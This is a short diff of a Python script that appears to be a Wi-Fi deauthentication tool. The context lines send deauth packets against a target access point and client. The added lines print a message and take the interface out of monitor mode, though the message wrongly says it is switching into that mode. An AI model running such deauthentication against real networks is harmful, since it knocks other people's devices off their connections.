@@ -28,3 +28,7 @@ def deauthenticate(iface):
 	for n in range(number_of_times):
 		sendp(pkt, iface=iface, count=number_of_pkts)
 		print(colors.get_color("ORANGE")+"[%s]" %(n+1) +" Deauth sent from: "+iface+" BSSID: "+target_ap_bssid+ " for Client: "+target_client_bssid+colors.get_color("ENDC"))
+
+	print ("Switching to monitor mode...")
+	manage_interfaces.disable_monitor(iface)
+	print (colors.get_color("GRAY") + "\nExiting...\nGoodbye!"+colors.get_color("ENDC"))
